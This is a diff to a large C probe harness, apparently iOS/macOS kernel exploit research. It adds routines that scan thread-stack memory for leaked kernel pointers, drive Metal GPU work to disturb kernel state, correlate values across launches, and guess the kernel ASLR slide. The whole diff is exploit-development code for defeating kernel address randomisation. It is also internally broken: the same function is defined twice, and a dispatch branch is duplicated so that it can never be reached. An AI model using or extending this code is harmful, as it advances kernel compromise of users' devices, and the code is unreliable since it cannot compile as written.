@@ -14472,6 +14472,649 @@ static void r350_probe(void) {
  *
  * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
  */
+/* r355: Confirm kernel heap leak stability and cross-launch correlation */
+static void r355_probe(void) {
+    rlog("\n=== r355: Kernel Heap Leak — Stability + Cross-Launch + Offset Calc ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+
+    #define IS_KPTR355(v) ( \
+        ((v) != 0) && \
+        ((v) != 0xFFFFFFFFFFFFFFFFULL) && \
+        ((v) != 0xFFFFFFFF00000000ULL) && \
+        ((v) != 0xFFFFFFFF00000001ULL) && \
+        ((v) != 0xFFFFFFFF89ABCDEFULL) && \
+        ((v) != 0xFFFFFFFFFFFFFFD1ULL) && \
+        ((v) >> 32) >= 0xFFFFFFF0UL \
+    )
+
+    /* ---- Part 1: Multi-pass stack scan to find stable kernel heap pointers ---- */
+    rlog("--- Part 1: 5-pass stack scan for stability analysis ---\n");
+    rlog("  r354 found: Stack[1]+462672 = 0xfffffffefd4f564a->0xfffffffefd4f55d6\n\n");
+    fflush(stdout);
+
+    /* GPU trigger helper */
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+    void *dev = NULL, *cmdQ = NULL;
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) dev = createDev();
+        if (dev) cmdQ = ((void*(*)(void*,void*))msgSend)(dev, regSel("newCommandQueue"));
+    }
+
+    /* Find the target stack region (second one, index 1) */
+    mach_vm_address_t stack1_addr = 0;
+    mach_vm_size_t stack1_sz = 0;
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+        int stack_idx = 0;
+
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+            if (info.user_tag == 30 && info.protection >= 3) {
+                if (stack_idx == 1) {
+                    stack1_addr = addr;
+                    stack1_sz = sz;
+                    rlog("  Target stack region: 0x%llx sz=0x%llx\n",
+                        (unsigned long long)addr, (unsigned long long)sz);
+                    break;
+                }
+                stack_idx++;
+            }
+            addr += sz;
+        }
+    }
+
+    if (stack1_addr == 0) {
+        rlog("  ERROR: Could not find second stack region!\n");
+        /* Try all stack regions */
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+        int idx = 0;
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+            if (info.user_tag == 30 && info.protection >= 3) {
+                rlog("  Stack[%d]: 0x%llx sz=0x%llx\n", idx,
+                    (unsigned long long)addr, (unsigned long long)sz);
+                /* Use the first one with enough data */
+                if (stack1_addr == 0 && sz >= 0x80000) {
+                    stack1_addr = addr;
+                    stack1_sz = sz;
+                }
+                idx++;
+            }
+            addr += sz;
+        }
+    }
+
+    if (stack1_addr == 0) {
+        rlog("  FATAL: No suitable stack region found\n");
+        goto r355_done;
+    }
+
+    /* Track up to 50 unique kernel-range offsets across 5 passes */
+    typedef struct { size_t offset; uint64_t vals[5]; } tracked_t;
+    tracked_t tracked[50];
+    int n_tracked = 0;
+
+    for (int pass = 0; pass < 5; pass++) {
+        rlog("  Pass %d: ", pass);
+        fflush(stdout);
+
+        /* Do GPU work between passes (except pass 0) */
+        if (pass > 0 && cmdQ) {
+            void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+                dev, regSel("newBufferWithLength:options:"), (size_t)(65536 * (pass + 1)), 0UL);
+            if (buf) {
+                void *cmdBuf = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (cmdBuf) {
+                    void *blit = ((void*(*)(void*,void*))msgSend)(cmdBuf, regSel("blitCommandEncoder"));
+                    if (blit) {
+                        typedef struct { unsigned long loc; unsigned long len; } NSR355;
+                        NSR355 r = {0, (unsigned long)(65536 * (pass + 1))};
+                        ((void(*)(void*,void*,void*,NSR355,uint8_t))msgSend)(
+                            blit, regSel("fillBuffer:range:value:"), buf, r, 0xAA + pass);
+                        ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                    }
+                    ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("commit"));
+                    ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("waitUntilCompleted"));
+                }
+                ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+            }
+        }
+
+        /* Scan the target stack region */
+        uint64_t *base = (uint64_t *)(uintptr_t)stack1_addr;
+        size_t nqw = (size_t)stack1_sz / 8;
+        if (nqw > 131072) nqw = 131072;
+        int hits = 0;
+
+        for (size_t i = 0; i < nqw; i++) {
+            uint64_t v = base[i];
+            if (!IS_KPTR355(v)) continue;
+
+            /* Skip common non-pointer constants */
+            if (v == 0xffffffffffc00000ULL || v == 0xffffffffffffff00ULL ||
+                v == 0xffffffffff0400f7ULL || v == 0xffffffffffffc000ULL ||
+                v == 0xfffffffffb440e00ULL || v == 0xfffffff000000000ULL ||
+                v == 0xfffffff800000000ULL || v == 0xfffffff007004000ULL ||
+                v == 0xfffffff007000000ULL || v == 0xfffffff027004000ULL ||
+                v == 0xfffffff037004000ULL || v == 0xfffffff047004000ULL ||
+                v == 0xfffffff017004000ULL || v == 0xfffffff00f004000ULL ||
+                (v & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFF00000000ULL)
+                continue;
+
+            size_t off = i * 8;
+            /* Find or add to tracked */
+            int found = -1;
+            for (int t = 0; t < n_tracked; t++) {
+                if (tracked[t].offset == off) { found = t; break; }
+            }
+            if (found < 0 && n_tracked < 50) {
+                found = n_tracked;
+                tracked[found].offset = off;
+                memset(tracked[found].vals, 0, sizeof(tracked[found].vals));
+                n_tracked++;
+            }
+            if (found >= 0) {
+                tracked[found].vals[pass] = v;
+            }
+            hits++;
+        }
+        rlog("%d interesting kernel-range values\n", hits);
+    }
+
+    /* Analyze tracked values */
+    rlog("\n  === STABILITY ANALYSIS (%d tracked offsets) ===\n", n_tracked);
+    int stable_count = 0, changing_count = 0;
+    uint64_t best_stable = 0;
+    size_t best_stable_offset = 0;
+    uint64_t best_changing = 0;
+    size_t best_changing_offset = 0;
+
+    for (int t = 0; t < n_tracked; t++) {
+        int present = 0, changed = 0;
+        uint64_t first_val = 0;
+        for (int p = 0; p < 5; p++) {
+            if (tracked[t].vals[p] != 0) {
+                if (first_val == 0) first_val = tracked[t].vals[p];
+                else if (tracked[t].vals[p] != first_val) changed = 1;
+                present++;
+            }
+        }
+
+        if (present >= 3) {
+            if (!changed && present == 5) {
+                /* Stable across all 5 passes */
+                rlog("  STABLE  +%zu:", tracked[t].offset);
+                for (int p = 0; p < 5; p++) rlog(" 0x%llx", (unsigned long long)tracked[t].vals[p]);
+                rlog("\n");
+                stable_count++;
+                if (best_stable == 0) {
+                    best_stable = first_val;
+                    best_stable_offset = tracked[t].offset;
+                }
+            } else if (changed) {
+                /* Changed between passes */
+                rlog("  CHANGED +%zu:", tracked[t].offset);
+                for (int p = 0; p < 5; p++) rlog(" 0x%llx", (unsigned long long)tracked[t].vals[p]);
+                rlog("\n");
+                changing_count++;
+                /* Prefer heap-range changing values */
+                if (best_changing == 0 && first_val >= 0xfffffffe00000000ULL && first_val < 0xfffffff000000000ULL) {
+                    best_changing = first_val;
+                    best_changing_offset = tracked[t].offset;
+                }
+            }
+        }
+    }
+    rlog("\n  Summary: %d stable, %d changing\n", stable_count, changing_count);
+
+    /* ---- Part 2: Cross-launch correlation ---- */
+    rlog("\n--- Part 2: Cross-launch correlation ---\n");
+    fflush(stdout);
+    {
+        /* Read previous state if exists */
+        FILE *sf = fopen("r355_state.bin", "rb");
+        if (sf) {
+            uint32_t magic = 0;
+            fread(&magic, 4, 1, sf);
+            if (magic == 0xDEAD0355) {
+                uint64_t prev_boottime = 0, prev_stable = 0, prev_changing = 0;
+                fread(&prev_boottime, 8, 1, sf);
+                fread(&prev_stable, 8, 1, sf);
+                fread(&prev_changing, 8, 1, sf);
+
+                struct timeval boottime;
+                size_t bt_size = sizeof(boottime);
+                int mib[2] = { CTL_KERN, KERN_BOOTTIME };
+                sysctl(mib, 2, &boottime, &bt_size, NULL, 0);
+
+                int same_boot = ((uint64_t)boottime.tv_sec == prev_boottime);
+                rlog("  Previous: boot=%llu stable=0x%llx changing=0x%llx\n",
+                    (unsigned long long)prev_boottime,
+                    (unsigned long long)prev_stable,
+                    (unsigned long long)prev_changing);
+                rlog("  Current:  boot=%llu stable=0x%llx changing=0x%llx\n",
+                    (unsigned long long)(uint64_t)boottime.tv_sec,
+                    (unsigned long long)best_stable,
+                    (unsigned long long)best_changing);
+                rlog("  Same boot: %s\n", same_boot ? "YES" : "NO");
+
+                if (prev_stable != 0 && best_stable != 0) {
+                    int64_t stable_delta = (int64_t)(best_stable - prev_stable);
+                    rlog("  Stable delta: %lld (0x%llx)\n", (long long)stable_delta, (unsigned long long)(uint64_t)stable_delta);
+                    if (same_boot && stable_delta == 0) {
+                        rlog("    -> SAME VALUE same boot = likely kernel object address (KASLR-dependent!)\n");
+                    } else if (!same_boot && stable_delta == 0) {
+                        rlog("    -> SAME VALUE different boot = NOT KASLR-dependent (constant)\n");
+                    } else if (!same_boot) {
+                        rlog("    -> DIFFERENT across boots = KASLR-dependent!\n");
+                        if ((stable_delta & 0x3FFF) == 0) {
+                            rlog("    -> Delta is page-aligned = likely KASLR slide difference!\n");
+                        }
+                    }
+                }
+                if (prev_changing != 0 && best_changing != 0) {
+                    int64_t chg_delta = (int64_t)(best_changing - prev_changing);
+                    rlog("  Changing delta: %lld (0x%llx)\n", (long long)chg_delta, (unsigned long long)(uint64_t)chg_delta);
+                }
+            }
+            fclose(sf);
+        } else {
+            rlog("  No previous state file (first run)\n");
+        }
+
+        /* Write current state */
+        sf = fopen("r355_state.bin", "wb");
+        if (sf) {
+            uint32_t magic = 0xDEAD0355;
+            fwrite(&magic, 4, 1, sf);
+            struct timeval boottime;
+            size_t bt_size = sizeof(boottime);
+            int mib[2] = { CTL_KERN, KERN_BOOTTIME };
+            sysctl(mib, 2, &boottime, &bt_size, NULL, 0);
+            uint64_t bt = (uint64_t)boottime.tv_sec;
+            fwrite(&bt, 8, 1, sf);
+            fwrite(&best_stable, 8, 1, sf);
+            fwrite(&best_changing, 8, 1, sf);
+            fclose(sf);
+            rlog("  State saved to r355_state.bin\n");
+        }
+    }
+
+    /* ---- Part 3: Offset calculations ---- */
+    rlog("\n--- Part 3: Kernel address offset analysis ---\n");
+    fflush(stdout);
+    {
+        uint64_t candidates[10];
+        int n_cand = 0;
+        if (best_stable) candidates[n_cand++] = best_stable;
+        if (best_changing) candidates[n_cand++] = best_changing;
+        /* Also add first few tracked values for analysis */
+        for (int t = 0; t < n_tracked && n_cand < 10; t++) {
+            for (int p = 0; p < 5; p++) {
+                uint64_t v = tracked[t].vals[p];
+                if (v != 0 && v != best_stable && v != best_changing) {
+                    int dup = 0;
+                    for (int k = 0; k < n_cand; k++) if (candidates[k] == v) { dup = 1; break; }
+                    if (!dup) { candidates[n_cand++] = v; break; }
+                }
+            }
+        }
+
+        for (int i = 0; i < n_cand; i++) {
+            uint64_t v = candidates[i];
+            rlog("  [%d] 0x%llx\n", i, (unsigned long long)v);
+
+            /* Classify into kernel VA ranges */
+            if (v >= 0xfffffff007004000ULL && v < 0xfffffff027004000ULL) {
+                uint64_t offset = v - 0xfffffff007004000ULL;
+                rlog("    KERNEL TEXT range (unslid base + 0x%llx)\n", (unsigned long long)offset);
+                if ((offset & 0x3FFF) == 0) {
+                    rlog("    *** PAGE-ALIGNED: possible slid base, slide=0x%llx ***\n",
+                        (unsigned long long)offset);
+                }
+            } else if (v >= 0xfffffffe00000000ULL && v < 0xfffffff000000000ULL) {
+                rlog("    KERNEL HEAP range\n");
+                /* Try common offsets from known kernel data structures */
+                /* On A20 Pro, kernel heap base is typically kslide-dependent */
+                uint64_t heap_offset = v - 0xfffffffe00000000ULL;
+                rlog("    Heap offset: 0x%llx (%llu MB from heap base)\n",
+                    (unsigned long long)heap_offset,
+                    (unsigned long long)(heap_offset / (1024*1024)));
+            } else if (v >= 0xfffffff000000000ULL && v < 0xfffffff007000000ULL) {
+                rlog("    PRE-TEXT kernel range\n");
+            } else {
+                rlog("    HIGH kernel range\n");
+            }
+
+            /* Page alignment check */
+            rlog("    bits[3:0]=0x%x bits[13:0]=0x%x bits[15:0]=0x%x\n",
+                (unsigned)(v & 0xF), (unsigned)(v & 0x3FFF), (unsigned)(v & 0xFFFF));
+        }
+    }
+
+    /* ---- Part 4: Wider scan — also scan ALL stack regions for heap ptrs ---- */
+    rlog("\n--- Part 4: All stack regions — heap pointer census ---\n");
+    fflush(stdout);
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+        int region_idx = 0;
+        int total_heap = 0;
+
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            if (info.user_tag == 30 && info.protection >= 3) {
+                uint64_t *base = (uint64_t *)(uintptr_t)addr;
+                size_t nqw = (size_t)sz / 8;
+                if (nqw > 131072) nqw = 131072;
+                int heap_count = 0;
+
+                for (size_t i = 0; i < nqw; i++) {
+                    uint64_t v = base[i];
+                    /* Only count heap-range values (0xfffffffe... to 0xfffffff0...) */
+                    if (v >= 0xfffffffe00000000ULL && v < 0xfffffff000000000ULL &&
+                        v != 0xFFFFFFFF00000000ULL && v != 0xFFFFFFFF00000001ULL &&
+                        v != 0xFFFFFFFF00000002ULL && v != 0xFFFFFFFF89ABCDEFULL) {
+                        if (heap_count < 5) {
+                            rlog("  Stack[%d]+%zu = 0x%llx\n", region_idx, i * 8, (unsigned long long)v);
+                        }
+                        heap_count++;
+                    }
+                }
+                if (heap_count > 5) rlog("  Stack[%d]: ... (%d total heap ptrs)\n", region_idx, heap_count);
+                else if (heap_count > 0) rlog("  Stack[%d]: %d heap ptrs\n", region_idx, heap_count);
+                total_heap += heap_count;
+                region_idx++;
+            }
+            addr += sz;
+        }
+        rlog("  Total: %d heap-range values across %d stack regions\n", total_heap, region_idx);
+    }
+
+r355_done:
+    if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
+    if (metal_lib) dlclose(metal_lib);
+    rlog("\n=== r355 complete ===\n");
+    fflush(stdout);
+    #undef IS_KPTR355
+}
+
+/* r355: KASLR slide computation from reliable stack leak at Stack[1]+462672 */
+static void r355_probe(void) {
+    rlog("\n=== r355: KASLR Slide Computation from Stack Kernel Pointer ===\n\n");
+    fflush(stdout);
+
+    /* ---- Find Stack[1] (second tag=30 VM region) ---- */
+    mach_vm_address_t stack1_base = 0;
+    mach_vm_size_t stack1_size = 0;
+    int stack_idx = 0;
+    {
+        mach_vm_address_t addr = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            uint32_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+            if (info.user_tag == 30 && (info.protection & VM_PROT_READ)) {
+                rlog("  Stack[%d]: 0x%llx sz=0x%llx\n", stack_idx,
+                    (unsigned long long)addr, (unsigned long long)sz);
+                if (stack_idx == 1) {
+                    stack1_base = addr;
+                    stack1_size = sz;
+                }
+                stack_idx++;
+            }
+            addr += sz;
+        }
+    }
+    if (!stack1_base) {
+        rlog("  ERROR: Stack[1] not found (%d stack regions total)\n", stack_idx);
+        goto r355_done;
+    }
+    rlog("  Using Stack[1]: 0x%llx sz=0x%llx\n\n",
+        (unsigned long long)stack1_base, (unsigned long long)stack1_size);
+
+    /* Target offset from r354: 462672 = 0x70F70 */
+    size_t target_offset = 462672;
+    if (target_offset + 8 > (size_t)stack1_size) {
+        rlog("  ERROR: target offset %zu > stack size %llu\n",
+            target_offset, (unsigned long long)stack1_size);
+        goto r355_done;
+    }
+
+    /* ---- Part 1: Multi-sample capture with GPU work between reads ---- */
+    rlog("--- Part 1: Multi-sample capture at Stack[1]+%zu ---\n", target_offset);
+    fflush(stdout);
+
+    #define R355_SAMPLES 10
+    uint64_t samples[R355_SAMPLES];
+    volatile uint64_t *target_ptr = (volatile uint64_t *)(uintptr_t)(stack1_base + target_offset);
+
+    /* Load Metal via dlsym */
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    typedef void *(*MTLCreateDev355_t)(void);
+    MTLCreateDev355_t createDev355 = metal_lib ?
+        (MTLCreateDev355_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice") : NULL;
+    void *(*msgSend355)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    void *(*regSel355)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+
+    void *mtlDev = (createDev355 && msgSend355 && regSel355) ? createDev355() : NULL;
+    void *cmdQ355 = NULL;
+    if (mtlDev) {
+        cmdQ355 = ((void*(*)(void*,void*))msgSend355)(mtlDev, regSel355("newCommandQueue"));
+    }
+
+    for (int s = 0; s < R355_SAMPLES; s++) {
+        /* Do GPU work to trigger kernel-side AGX state changes */
+        if (cmdQ355) {
+            void *selNewBuf = regSel355("newBufferWithLength:options:");
+            size_t bsz = 4096 * (s + 1);
+            void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend355)(
+                mtlDev, selNewBuf, bsz, 0UL);
+            void *cb = ((void*(*)(void*,void*))msgSend355)(cmdQ355, regSel355("commandBuffer"));
+            if (cb && buf) {
+                void *blit = ((void*(*)(void*,void*))msgSend355)(cb, regSel355("blitCommandEncoder"));
+                if (blit) {
+                    typedef struct { unsigned long loc; unsigned long len; } NSR355;
+                    NSR355 rng = {0, bsz < 4096 ? bsz : 4096};
+                    ((void(*)(void*,void*,void*,NSR355,uint8_t))msgSend355)(
+                        blit, regSel355("fillBuffer:range:value:"), buf, rng, 0xAA + s);
+                    ((void(*)(void*,void*))msgSend355)(blit, regSel355("endEncoding"));
+                }
+                ((void(*)(void*,void*))msgSend355)(cb, regSel355("commit"));
+                ((void(*)(void*,void*))msgSend355)(cb, regSel355("waitUntilCompleted"));
+            }
+            if (buf) ((void(*)(void*,void*))msgSend355)(buf, regSel355("release"));
+        }
+
+        samples[s] = *target_ptr;
+        rlog("  Sample[%d] = 0x%llx", s, (unsigned long long)samples[s]);
+        if (s > 0 && samples[s] != samples[s-1]) {
+            int64_t delta = (int64_t)(samples[s] - samples[s-1]);
+            rlog("  (delta=%+lld)", (long long)delta);
+        }
+        rlog("\n");
+    }
+    fflush(stdout);
+
+    /* Analyze samples */
+    uint64_t min_val = samples[0], max_val = samples[0];
+    int changes = 0;
+    for (int s = 1; s < R355_SAMPLES; s++) {
+        if (samples[s] != samples[s-1]) changes++;
+        if (samples[s] < min_val) min_val = samples[s];
+        if (samples[s] > max_val) max_val = samples[s];
+    }
+    uint64_t range = max_val - min_val;
+    rlog("  Changes: %d/%d, range: 0x%llx, stable high bits: 0x%llx\n",
+        changes, R355_SAMPLES-1, (unsigned long long)range,
+        (unsigned long long)(samples[0] & ~0xFFFFULL));
+
+    /* ---- Part 2: Slide computation attempts ---- */
+    rlog("\n--- Part 2: KASLR slide computation ---\n");
+    fflush(stdout);
+
+    uint64_t last_val = samples[R355_SAMPLES - 1];
+    rlog("  Using last sample: 0x%llx\n", (unsigned long long)last_val);
+
+    /* Method A: If the value is in the kernel text range (slid), compute directly */
+    if (last_val >= 0xfffffff007004000ULL && last_val < 0xfffffff107004000ULL) {
+        uint64_t slide_a = (last_val & ~0x3FFFULL) - 0xfffffff007004000ULL;
+        rlog("  Method A (text range): slide = 0x%llx\n", (unsigned long long)slide_a);
+    } else {
+        rlog("  Method A (text range): value not in kernel text range\n");
+    }
+
+    /* Method B: The 0xFFFFFFFE range — check zone_map offset from kernel base
+       On iOS, zone_map_min_address is typically at a fixed offset from kernel base.
+       Common layout: zones at KBASE + ~0x1F7000000 to 0x1F8000000 on A14+
+       Or the value could be kernel stack addresses */
+    uint64_t zone_base_candidate = last_val & 0xFFFFFFFFFF000000ULL;
+    rlog("  Method B (zone base): 0x%llx (page-aligned: 0x%llx)\n",
+        (unsigned long long)zone_base_candidate,
+        (unsigned long long)(last_val & ~0x3FFFULL));
+
+    /* Method C: Check if the high 32 bits give a consistent prefix across samples */
+    rlog("  Method C (prefix analysis):\n");
+    uint64_t prefix_mask = 0xFFFFFFFFFF000000ULL;
+    int prefix_stable = 1;
+    for (int s = 1; s < R355_SAMPLES; s++) {
+        if ((samples[s] & prefix_mask) != (samples[0] & prefix_mask)) {
+            prefix_stable = 0;
+            break;
+        }
+    }
+    rlog("    24-bit prefix stable: %s (0x%llx)\n",
+        prefix_stable ? "YES" : "NO",
+        (unsigned long long)(samples[0] & prefix_mask));
+
+    /* Method D: Try multiple known zone offsets from kernel text */
+    rlog("  Method D (zone offset guesses):\n");
+    uint64_t offsets[] = {
+        0x1F7000000ULL, 0x1F8000000ULL, 0x1F6000000ULL,
+        0x1F9000000ULL, 0x1FA000000ULL, 0x200000000ULL,
+        0x1FB000000ULL, 0x1FC000000ULL, 0x1FD000000ULL,
+        0x1FE000000ULL, 0x1FF000000ULL, 0
+    };
+    for (int i = 0; offsets[i]; i++) {
+        uint64_t base_guess = zone_base_candidate - offsets[i];
+        /* Check if base_guess looks like slid kernel text */
+        if (base_guess >= 0xfffffff007004000ULL && base_guess < 0xfffffff107004000ULL) {
+            uint64_t slide = base_guess - 0xfffffff007004000ULL;
+            if ((slide & 0x3FFF) == 0) {
+                rlog("    offset=0x%llx -> kbase=0x%llx -> slide=0x%llx\n",
+                    (unsigned long long)offsets[i],
+                    (unsigned long long)base_guess,
+                    (unsigned long long)slide);
+            }
+        }
+    }
+
+    /* ---- Part 3: Stability test (rapid reads without GPU work) ---- */
+    rlog("\n--- Part 3: Stability test (no GPU work between reads) ---\n");
+    fflush(stdout);
+
+    uint64_t stable_samples[5];
+    for (int s = 0; s < 5; s++) {
+        stable_samples[s] = *target_ptr;
+    }
+    int all_same = 1;
+    for (int s = 1; s < 5; s++) {
+        if (stable_samples[s] != stable_samples[0]) { all_same = 0; break; }
+    }
+    rlog("  5 rapid reads: %s = 0x%llx\n",
+        all_same ? "ALL SAME" : "VARYING",
+        (unsigned long long)stable_samples[0]);
+    if (!all_same) {
+        for (int s = 0; s < 5; s++)
+            rlog("    [%d] 0x%llx\n", s, (unsigned long long)stable_samples[s]);
+    }
+
+    /* ---- Part 4: Cross-offset scan of 460000-470000 ---- */
+    rlog("\n--- Part 4: Cross-offset scan (460000-470000) with stability check ---\n");
+    fflush(stdout);
+
+    size_t scan_start = 460000;
+    size_t scan_end = 470000;
+    if (scan_end > (size_t)stack1_size) scan_end = (size_t)stack1_size;
+
+    int novel_count = 0;
+    for (size_t off = scan_start; off + 8 <= scan_end; off += 8) {
+        volatile uint64_t *p = (volatile uint64_t *)(uintptr_t)(stack1_base + off);
+        uint64_t v1 = *p;
+        if ((v1 & 0xFFFFF00000000000ULL) != 0xFFFFF00000000000ULL) continue;
+        if (v1 == 0 || v1 == 0xFFFFFFFFFFFFFFFFULL) continue;
+        /* Filter very common constants */
+        if (v1 == 0xfffffff000000000ULL || v1 == 0xfffffff800000000ULL ||
+            v1 == 0xffffffffffc00000ULL || v1 == 0xffffffffffffff00ULL ||
+            v1 == 0xffffffc000000000ULL || v1 == 0xffffffffffffc000ULL ||
+            v1 == 0xffffffffff0400f7ULL || v1 == 0xfffffffffb440e00ULL) continue;
+        if ((v1 & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFF00000000ULL &&
+            (v1 & 0xFFFFFFFFULL) < 0x1000) continue;
+        if ((v1 & 0xFFFFFFFFFFFFFF00ULL) == 0xFFFFFFFFFFFFFF00ULL) continue;
+
+        /* Do GPU work then re-read */
+        if (cmdQ355) {
+            void *cb = ((void*(*)(void*,void*))msgSend355)(cmdQ355, regSel355("commandBuffer"));
+            if (cb) {
+                ((void(*)(void*,void*))msgSend355)(cb, regSel355("commit"));
+                ((void(*)(void*,void*))msgSend355)(cb, regSel355("waitUntilCompleted"));
+            }
+        }
+        uint64_t v2 = *p;
+        char *status = (v1 == v2) ? "STABLE" : "CHANGED";
+        rlog("  +%zu: 0x%llx -> 0x%llx [%s]\n", off,
+            (unsigned long long)v1, (unsigned long long)v2, status);
+        novel_count++;
+        if (novel_count >= 30) break;
+    }
+    rlog("  Novel values in range: %d\n", novel_count);
+
+    /* Cleanup */
+    if (cmdQ355) ((void(*)(void*,void*))msgSend355)(cmdQ355, regSel355("release"));
+    if (metal_lib) dlclose(metal_lib);
+
+    rlog("\n=== r355 complete ===\n");
+    fflush(stdout);
+
+r355_done:
+    #undef R355_SAMPLES
+    (void)0;
+}
+
 /* r354: Targeted VM Region Rescan — reproduce r352's changing kernel VA in tag=30 regions */
 static void r354_probe(void) {
     rlog("\n=== r354: Targeted VM Region Rescan — Stack + Shared Cache ===\n\n");
@@ -51025,6 +51668,22 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 358) {
+            rlog("*** rounds=358: Kernel Heap Leak — Stability + Cross-Launch ***\n");
+            rlog("  r354 found: Stack[1]+462672 live kernel heap ptr 0xfffffffefd4f55d6\n");
+            rlog("  5-pass stability test + cross-launch correlation + offset calc\n\n");
+            fflush(stdout);
+            r355_probe();
+            goto done;
+        }
+        if (rounds == 358) {
+            rlog("*** rounds=358: KASLR Slide Computation from Stack Leak ***\n");
+            rlog("  r354: 0xFFFFFFFEFD01xxxx at Stack[1]+462672 changed between GPU passes.\n");
+            rlog("  r355: multi-sample capture, slide computation, stability test.\n\n");
+            fflush(stdout);
+            r355_probe();
+            goto done;
+        }
         if (rounds == 357) {
             rlog("*** rounds=357: VM Region Rescan — relaxed filter, stack + cache ***\n");
             rlog("  r353: 0 hits (alignment filter + wrong region). Fixing both.\n");
@@ -53093,7 +53752,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -62935,7 +63594,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
